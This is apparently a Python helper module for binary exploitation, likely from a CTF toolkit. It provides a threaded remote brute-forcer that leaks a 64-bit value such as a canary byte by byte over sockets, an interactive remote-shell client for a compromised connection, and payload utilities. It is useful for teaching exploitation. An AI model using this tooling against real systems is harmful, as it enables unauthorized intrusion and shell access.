from struct import pack, unpack
from concurrent.futures import ThreadPoolExecutor
import socket

from libc_db_search import *
from logger import Logger

to_bytes = lambda x: pack("Q", x)

def from_bytes(x):

    while(len(x) < 8):
        x += b'\x00'

    return unpack("Q", x)[0]
    
def rol(x, q, b=64):
    q %= b
    return ((x << q) | (x >> (b - q))) & (2 ** b - 1)

def ror(x, q, b=64):
    q %= b
    return ((x >> q) | (x << (b - q))) & (2 ** b - 1)

# also checks for newline
def check_whitespaces(payload):

    whitespaces = [b'\x09', b'\x0a', b'\x0b', b'\x0c', b'\x0d', b'\x20', b'\x85', b'\xa0', b'\n']
    for c in whitespaces:
        if c in payload:
            raise RuntimeError(f"Whitespace character {c} detected in payload; terminating\n")

class Remote_64bitBruteforce:

    # hints should be a dictionary of the form {byte from [0, 7]: [(lo0, hi0), (lo1, hi1), ...]}
    # where each pair (lo_i, hi_i) indicates a closed interval of values to be tried for that particular byte
    # an interval of the form (val, val) indicates thet only one value (val) should be tried
    # if hints is none, every possible value is tried for every byte
    #
    # byte_check_function(socket, byte_value_to_try, payload_prefix) -> byte (if ok) / None (if not ok)
    def __init__(self, target_ipv4, target_port, byte_check_function, payload_prefix, max_thrcnt=32, hints=None, print_log=True, session_name="BRUTEFORCE"):
        
        self.TARGET_IP = target_ipv4
        self.TARGET_PORT = target_port

        # dictionary of the same form as hits
        self.buteforce_intervals = {}

        if hints is None:
            self.buteforce_intervals = {byte: [(b'\x00', b'\xff')] for byte in range(8)}
        else:
            self.buteforce_intervals = hints
            for b in range(8):
                if b not in self.buteforce_intervals.keys():
                    self.buteforce_intervals.update({b: [(b'\x00', b'\xff')]})

        self.max_thrcnt = max_thrcnt
        
        self.prefix = payload_prefix
        self.leaked = b''

        self._try_val = byte_check_function

        self.logger = Logger(session_name = session_name, print_log = print_log)

    def _bruteforce_values(self, byte):

        b_hints = self.buteforce_intervals[byte]

        for lo_b, hi_b in b_hints:

            lo = int.from_bytes(lo_b, 'little')
            hi = int.from_bytes(hi_b, 'little')

            for val in range(lo, hi + 1):
                yield val.to_bytes(1, 'little')

    def _bytewise_bruteforce(self, byte, _t):

        tests = []
        
        with ThreadPoolExecutor(self.max_thrcnt) as threadpool:

            for byte_val in self._bruteforce_values(byte):

                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.TARGET_IP, self.TARGET_PORT))
            
                tests.append(threadpool.submit(self._try_val, sock, byte_val, self.prefix + self.leaked))

            for t in tests:
                
                ok_byte = t.result()
                if ok_byte is not None:
                    
                    self.logger.log_success(f"Byte {byte} found: {ok_byte}")

                    self.leaked += ok_byte
                    return

            self.logger.log_warning(f"Could not find any accepted value for byte {byte}; terminating", end_timer = _t)
            quit()

    def find_value(self):

        _t = self.logger.log_info(f"Starting bruteforce on {self.TARGET_IP}:{self.TARGET_PORT}...", start_timer = True)

        for b in range(8):
            self._bytewise_bruteforce(b, _t)

        self.logger.log_success(f"Value leaked: {self.leaked}", end_timer = _t)
        return self.leaked

def remote_shell(sock: socket.socket, socket_timeout=3, max_recv_dim=4096, rich=False):

    logger = Logger(session_name = "REMOTE SHELL", print_log = True)

    def _simple_interface_thunk():
        
        while(True):
            
            command = input("$ ")

            sock.send(f"{command}\n".encode())

            if command == "exit":
                logger.log_warning("Remote shell disconnected")
                break

            try:
                print(sock.recv(max_recv_dim).decode()[:-1])
            except socket.timeout:
                pass
    
    # FIXME: HAS BUGS
    def _rich_interface_thunk():

        sock.send("whoami\n".encode())
        user = sock.recv(1024).decode()[:-1]

        shell_symbol = None
        if user == "root":
            shell_symbol = "# "
        else:
            shell_symbol = "$ "
        
        current_path = ""

        while(True):

            sock.send("pwd\n".encode())
            current_path = sock.recv(4096).decode()[:-1]
            
            command = input(f"{user}:{current_path}{shell_symbol}")

            sock.send(f"{command}\n".encode())

            if command == "exit":
                logger.log_warning("Remote shell disconnected")
                break

            try:
                print(sock.recv(max_recv_dim).decode()[:-1])
            except socket.timeout:
                pass

    try:

        sock.settimeout(socket_timeout)

        if rich is True:
            _rich_interface_thunk()
        else:
            _simple_interface_thunk()
        
    except KeyboardInterrupt:
        logger.log_warning("Remote shell disconnected")

    except Exception as err:
        logger.log_warning(f"ERROR while executing remote shell: {err.args}")

# generator for all bytes of form 0x?p, where prefix = 0x0p
def bytes_start_with(prefix):

    b = int.from_bytes(prefix, 'little')
    for i in range(16):
        val = ((i << 4) | b)
        yield val.to_bytes(1, 'little')

# generator for all bytes of form 0xs?, where suffix = 0xs0
def bytes_end_with(suffix):

    b = int.from_bytes(suffix, 'little')
    for i in range(16):
        val = (b | i)
        yield val.to_bytes(1, 'little')

def _is_int(to_check: str):

    if type(to_check) == int:
        return to_check
            
    failed_conversion = 0
    int_conversion = 0

    try:
        int_conversion = int(to_check, 10)
    except Exception:
        failed_conversion += 1

    if failed_conversion == 1:
        try:
            int_conversion = int(to_check, 16)
        except Exception:
            failed_conversion += 1

    if failed_conversion == 2:
        return None

    return int_conversion
